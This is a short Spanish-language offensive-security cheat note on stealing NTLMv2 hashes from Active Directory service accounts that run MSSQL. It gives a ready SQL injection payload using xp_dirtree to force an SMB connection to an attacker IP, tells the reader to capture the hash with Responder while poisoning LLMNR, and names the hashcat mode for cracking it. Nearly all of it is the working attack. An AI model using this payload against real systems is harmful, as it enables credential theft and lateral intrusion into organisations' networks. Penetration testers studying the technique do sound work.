### INFO
Muchos sysadmin gestionan los usuarios de los servicios con cuentas de AD. 
Estos usuarios, debido a la falta de un optimo diseño de permisos pueden ser capaces de consumir
datos/archivos de carpetas compartidas.
La jugada es aprovechar esto para hacer a este user de servicio visitar una carpeta compartida
bajo nuestro poder (sea esta existente o no).

Simplemente corremos responder para envenenar el tráfico LLMNR y enviamos la instrucción:

    ';EXEC master..xp_dirtree '\\<ATTACKER_IP>\myshare', 1, 1;--

Debería llegarnos al responder el hash NTLM v2.

podemos crackearlo con hashcat en modo 5600